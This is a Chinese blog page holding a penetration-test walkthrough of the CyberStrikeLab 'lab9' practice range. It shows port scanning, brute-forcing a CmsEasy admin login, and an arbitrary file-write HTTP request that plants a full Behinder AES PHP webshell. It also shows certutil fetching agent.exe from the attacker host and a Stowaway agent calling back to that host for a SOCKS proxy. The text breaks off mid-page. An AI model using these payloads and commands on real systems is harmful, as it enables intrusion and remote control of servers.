<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/EF0DQAJMXN-imPciCFJTJ/_buildManifest.js" defer=""></script><script src="/_next/static/EF0DQAJMXN-imPciCFJTJ/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Cyberstrikelablab9","contentHtml":"\u003ch1\u003elab9\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.cyberstrikelab.com/#/target/kvm_detail/269\"\u003ehttps://www.cyberstrikelab.com/#/target/kvm_detail/269\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e靶标介绍：ATT\u0026#x26;CK实战框架-lab9\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第一阶段：web 服务突破\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e核心动作：通过「特定凭证」登录后台管理系统\u003c/p\u003e\n\u003cp\u003e关键操作：利用工具 A 抓取通信数据，植入「特殊代码片段」\u003c/p\u003e\n\u003cp\u003e成果：成功建立「隐蔽连接通道」，获取基础权限\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第二阶段：内网横向渗透\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e核心动作：从普通权限「层层递进」至最高系统权限\u003c/p\u003e\n\u003cp\u003e关键操作：使用工具 B 完成「远控上线」，扫描「内网段资产」\u003c/p\u003e\n\u003cp\u003e成果：破解「某协议共享密码」，直达核心数据区\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第三阶段：域控终极突破\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e核心动作：检测「某证书服务漏洞」，伪造身份凭证\u003c/p\u003e\n\u003cp\u003e关键操作：通过工具 C 生成「特殊格式证书」，模拟「高权限用户」\u003c/p\u003e\n\u003cp\u003e成果：绕过域控防护，最终获取「系统关键标识」\u003c/p\u003e\n\u003cp\u003ePS：校园网害人，一大半时间卡在上传文件，换流量就好了…\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e这里要使用 \u003ccode\u003e5000\u003c/code\u003e 的速率来扫，\u003ccode\u003e10000\u003c/code\u003e 速率大概率端口扫描不全\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 nmap -sT -min-rate 5000 -p- 172.5.33.6\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-20 20:51 EDT\nStats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\nConnect Scan Timing: About 69.47% \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e; ETC: 20:52 (0:00:08 remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 172-5-33-6.lightspeed.miamfl.sbcglobal.net (172.5.33.6)\nHost is up (0.015s latency).\nNot shown: 65527 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n25/tcp    open  smtp\n80/tcp    open  http\n110/tcp   open  pop3\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n47001/tcp open  winrm\n49669/tcp open  unknown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e无法使用匿名账户对\u003ccode\u003eSMB\u003c/code\u003e进行登录 （PS：下面这些是当时靶机BUG无法启动 Web 时测试的）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tools smbclient -L 172.5.33.6 -U anonymous\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行\u003ccode\u003eRPCdump\u003c/code\u003e  ，能得到主机名 \u003ccode\u003eWIN-784BAKDI0AC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tools rpcdump.py 172.5.33.6\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Retrieving endpoint list from 172.5.33.6\nProtocol: [MS-RSP]: Remote Shutdown Protocol\nProvider: wininit.exe\nUUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0\nBindings:\n          ncacn_ip_tcp:172.5.33.6[49664]\n          ncalrpc:[WindowsShutdown]\n          ncacn_np:\\\\WIN-784BAKDI0AC[\\PIPE\\InitShutdown]\n          ncalrpc:[WMsgKRpc04A670]\n\nProtocol: N/A\nProvider: winlogon.exe\nUUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0\nBindings:\n          ncalrpc:[WindowsShutdown]\n          ncacn_np:\\\\WIN-784BAKDI0AC[\\PIPE\\InitShutdown]\n          ncalrpc:[WMsgKRpc04A670]\n          ncalrpc:[WMsgKRpc04A971]\n          ....\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003efscan\u003c/code\u003e 扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tools ./fscan_1.8.4 -h 172.5.33.6                                 \n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n172.5.33.6:139 open\n172.5.33.6:80 open\n172.5.33.6:3306 open\n172.5.33.6:135 open\n172.5.33.6:445 open\n[*] alive ports len is: 5\nstart vulscan\n[*] NetInfo \n[*]172.5.33.6\n   [-\u003e]WIN-784BAKDI0AC\n   [-\u003e]172.5.33.6\n   [-\u003e]10.6.6.10\n[*] WebTitle http://172.5.33.6         code:200 len:77277  title:中文网页标题\n已完成 5/5\n[*] 扫描结束,耗时: 50.962777759s\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为可能是 \u003ccode\u003e2008R2\u003c/code\u003e，检测一下永恒之蓝，但是并没有\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eWeb 渗透 - 172.5.33.6\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在页脚中能找到  \u003ccode\u003ePowered by CmsEasy\u003c/code\u003e ，易通企业网站系统\u003c/p\u003e\n\u003ch3\u003e密码爆破\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e/admin\u003c/code\u003e 进入后台登录接口，进行弱密码测试\u003c/p\u003e\n\u003cp\u003e进行密码爆破时，需要将 \u003ccode\u003ecookie\u003c/code\u003e 和验证码参数删掉\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到密码 \u003ccode\u003eadmin123456\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e后台利用\u003c/h3\u003e\n\u003cp\u003e通过搜索引擎搜索，能找到几个命令执行的漏洞\u003c/p\u003e\n\u003cp\u003e这里使用：\u003ca href=\"https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Epoc\"\u003ehttps://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Epoc\u003c/a\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e首先将登陆后的 Cookie 拿过来利用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eCookie: PHPSESSID=r8olfavkomt6tla7pn9j306ue0; loginfalse74c6352c5a281ec5947783b8a186e225=21; loginfalse=0; login_username=admin; login_password=9776624e56cfa87e5d04672056ffeac9\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e构造数据包，将自己的 \u003ccode\u003eCookie\u003c/code\u003e 替换上去即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePOST /index.php?\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e=template\u0026#x26;act=save\u0026#x26;admin_dir=admin\u0026#x26;site=default HTTP/1.1\nHost: 172.5.33.6\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: http://172.5.33.6/index.php?\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e=admin\u0026#x26;act=login\u0026#x26;admin_dir=admin\u0026#x26;site=default\nDNT: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\nSec-GPC: 1\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nCookie: PHPSESSID=r8olfavkomt6tla7pn9j306ue0; loginfalse74c6352c5a281ec5947783b8a186e225=21; loginfalse=0; login_username=admin; login_password=9776624e56cfa87e5d04672056ffeac9\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\n\nsid=#data_d_.._d_.._d_.._d_1.php\u0026#x26;slen=693\u0026#x26;scontent=\u0026#x3C;?php phpinfo();?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问是否写入成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e写入冰蝎的\u003ccode\u003epayload\u003c/code\u003e（这里你也可以蚁剑）\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003edefault_aes\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php\n@error_reporting(0);\n\t\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e Decrypt(\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e)\n\t{\n\t\t\u003cspan class=\"hljs-variable\"\u003e$key\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"e45e329feb5d925b\"\u003c/span\u003e;\n\t\t\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e openssl_decrypt(base64_decode(\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e), \u003cspan class=\"hljs-string\"\u003e\"AES-128-ECB\"\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$key\u003c/span\u003e,OPENSSL_PKCS1_PADDING);\n\t}\n\u003cspan class=\"hljs-variable\"\u003e$post\u003c/span\u003e=Decrypt(file_get_contents(\u003cspan class=\"hljs-string\"\u003e\"php://input\"\u003c/span\u003e));\n@\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$post\u003c/span\u003e);\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eflag 1\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e flag.txt\ngo-flag{8EC18759-1F45-4C34-9743-95DAABCA5CC1}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e代理 - Stowaway\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003eIP\u003c/code\u003e 信息，能发现内网网段是 \u003ccode\u003e10.6.6.10\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:/phpstudy_pro/WWW/ \u003eipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网实例 1:\n\n   连接特定的 DNS 后缀 . . . . . . . : \n   本地链接 IPv6 地址. . . . . . . . : fe80::54a5:afba:bf67:addf%11\n   IPv4 地址 . . . . . . . . . . . . : 172.5.33.6\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 172.5.33.233\n\n以太网适配器 以太网实例 2:\n\n   连接特定的 DNS 后缀 . . . . . . . : \n   本地链接 IPv6 地址. . . . . . . . : fe80::78bb:2e32:19c6:2d7%2\n   IPv4 地址 . . . . . . . . . . . . : 10.6.6.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 10.6.6.1\n\n隧道适配器 isatap.{730545FA-7DC0-4716-8AF2-678FFC6D1F1C}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开连接\n   连接特定的 DNS 后缀 . . . . . . . : \n\n隧道适配器 isatap.{E6E2FD25-6949-4C86-A749-7F0F14616295}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开连接\n   连接特定的 DNS 后缀 . . . . . . . : \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003estowaway\u003c/code\u003e 来搭建代理，使用 \u003ccode\u003ecertutil\u003c/code\u003e （\u003ccode\u003eWebShell\u003c/code\u003e没法进行上传，冰蝎蚁剑都是）拉取攻击机上的\u003ccode\u003estowaway\u003c/code\u003e 客户端\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:/phpstudy_pro/WWW/ \u003ecertutil -f -\u003cspan class=\"hljs-built_in\"\u003esplit\u003c/span\u003e -urlcache http://172.16.233.2/agent.exe\n\n****  联机  ****\n  000000  ...\n  22c600\nCertUtil: -URLCache 命令成功完成。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e服务端（攻击机）监听 \u003ccode\u003e8000\u003c/code\u003e 端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e.\\windows_x64_admin.exe -l 8000 -s 123\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e客户端连接服务端\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:/phpstudy_pro/WWW/ \u003eagent.exe -c 172.16.233.2:8000 -s 123 --reconnect 8\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e客户端连接后服务端就能看到连接上了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS D:\\All\\Study\\security\\tools\\stowaway\u003e .\\windows_x64_admin.exe -l 8000 -s 123\n[*] Starting admin node on port 8000\n\n    .-\u003cspan class=\"hljs-string\"\u003e')    .-'\u003c/span\u003e) _                  (\u003cspan class=\"hljs-string\"\u003e'\\ .-'\u003c/span\u003e) /\u003cspan class=\"hljs-string\"\u003e'  ('\u003c/span\u003e-.      (\u003cspan class=\"hljs-string\"\u003e'\\ .-'\u003c/span\u003e) /\u003cspan class=\"hljs-string\"\u003e'  ('\u003c/span\u003e-.\n   ( OO ). (  OO) )                  \u003cspan class=\"hljs-string\"\u003e'.( OO ),'\u003c/span\u003e ( OO ).-.   \u003cspan class=\"hljs-string\"\u003e'.( OO ),'\u003c/span\u003e ( OO ).-.\n   (_)---\\_)/     \u003cspan class=\"hljs-string\"\u003e'._  .-'\u003c/span\u003e),-----. ,--./  .--.   / . --. /,--./  .--.   / . --. /  ,--.   ,--.\n   /    _ | |\u003cspan class=\"hljs-string\"\u003e'--...__)( OO'\u003c/span\u003e  .-.  \u003cspan class=\"hljs-string\"\u003e'|      |  |   | \\-.  \\ |      |  |   | \\-.  \\    \\  '\u003c/span\u003e.\u003cspan class=\"hljs-string\"\u003e'  /\n   \\  :'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'. '\u003c/span\u003e--.  .--\u003cspan class=\"hljs-string\"\u003e'/   |  | |  ||  |   |  |,.-'\u003c/span\u003e-\u003cspan class=\"hljs-string\"\u003e'  |  ||  |   |  |,.-'\u003c/span\u003e-\u003cspan class=\"hljs-string\"\u003e'  |  | .-'\u003c/span\u003e)     /\n    \u003cspan class=\"hljs-string\"\u003e'..'\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e.)   |  |   \\_) |  |\\|  ||  |.\u003cspan class=\"hljs-string\"\u003e'.|  |_)\\| |_.'\u003c/span\u003e  ||  |.\u003cspan class=\"hljs-string\"\u003e'.|  |_)\\| |_.'\u003c/span\u003e  |(OO  \\   /\n   .-._)   \\   |  |     \\ |  | |  ||         |   |  .-.  ||         |   |  .-.  | |   /  /\\_\n   \\       /   |  |      \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e'-'\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e'|   ,'\u003c/span\u003e.   |   |  | |  ||   ,\u003cspan class=\"hljs-string\"\u003e'.   |   |  | |  | '\u003c/span\u003e-./  /.__)\n    \u003cspan class=\"hljs-string\"\u003e'-----'\u003c/span\u003e    \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e        \u003cspan class=\"hljs-string\"\u003e'-----'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e'--'\u003c/span\u003e\n                                    { v2.2  Author:ph4ntom }\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new connection...\n[*] Connection from node 172.5.33.6:49677 is \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e up successfully! Node \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 0\n(admin) \u003e\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置 \u003ccode\u003esocks\u003c/code\u003e 代理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e use 0\n(node 0) \u003e\u003e socks 8001 admin admin\n[*] Trying to listen on 0.0.0.0:8001......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Socks start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eKali\u003c/code\u003e 配置 \u003ccode\u003eproxychains\u003c/code\u003e 后进行测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ~ proxychains4 curl 10.6.6.10\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  172.16.233.2:8001  ...  10.6.6.10:80  ...  OK\n\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html\u003e\n\u0026#x3C;\u003cspan 